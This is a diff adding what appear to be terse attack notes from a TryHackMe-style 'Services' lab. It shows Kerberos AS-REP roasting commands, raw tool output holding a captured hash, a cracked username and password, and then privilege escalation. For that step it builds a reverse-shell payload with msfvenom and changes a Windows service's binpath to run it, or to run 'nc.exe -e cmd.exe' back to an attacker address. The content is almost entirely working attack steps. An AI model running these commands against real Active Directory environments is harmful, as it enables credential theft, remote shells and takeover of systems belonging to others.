@@ -1,0 +1,36 @@
+python3 GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip [IP-ADDRESS] -format hashcat
+
+python3 GetNPUsers.py CORP.LOCAL/ -usersfile users.txt -dc-ip 192.168.1.100 -format hashcat
+
+crackmapexec ldap [DC-IP] -u users.txt --asreproast
+
+
+j.doe@services.local
+Joanne Doe
+Jack Rock
+Will Masters
+Johnny LaRusso
+
+
+
+❯ python3 GetNPUsers.py services.local/ -dc-ip 10.10.142.46 -usersfile /home/sherlock-parrot/THM/ROOM-CHANGLLENGES/Services/user-osint.txt -format hashcat
+
+Impacket v0.13.0.dev0+20250311.90921.678cd0ab - Copyright Fortra, LLC and its affiliated companies 
+
+[-] User j.doe doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$j.rock@SERVICES.LOCAL:bed3f07a7fccec6a37b79181aa039a6a$e4044a43c2025e8a7d2d1e9ca39482c70d608e6756a89628220f70e1a61375a957a6343fcf8948c2196e0baf2da054f000bafabfcea111a89c181e79a7be99a7c8bd8616b311047f296baf448c5e58640fa0cba08f5192b524f1b0528d4fe194b3894425ab8156b7c71da507c7b978bc69f605bc1e93ac21f3e21d06a2fb98832ac34f60a31bdab262378472fa98c0de872a8654b2d9dbede4472e747d79d58d6ddac0c012a0f7d501aae6f36ed5055d563d4701e6ca80bfcbbef2f8ea1f6a0e5ee61a02f9b93cc753c6fe2099d80014c1c2fc6508372624824acd79f501937ad7481af544ab55f0a860fd3b2ed01d72
+[-] User w.masters doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] User j.larusso doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] invalid principal syntax
+
+j.rock:Serviceworks1
+
+
+BUILTIN\Server Operators
+
+msfvenom -p windows/x64/shell/reverse_tcp lhost=10.8.34.3 lport=8888 -f exe > shell.exe
+
+sc.exe config cfn-hup binpath="C:\Users\j.rock\Documents\re.exe"
+
+sc.exe config cfn-hup binPath="C:\Users\j.rock\Documents\nc.exe -e cmd.exe 10.8.34.3 8888"
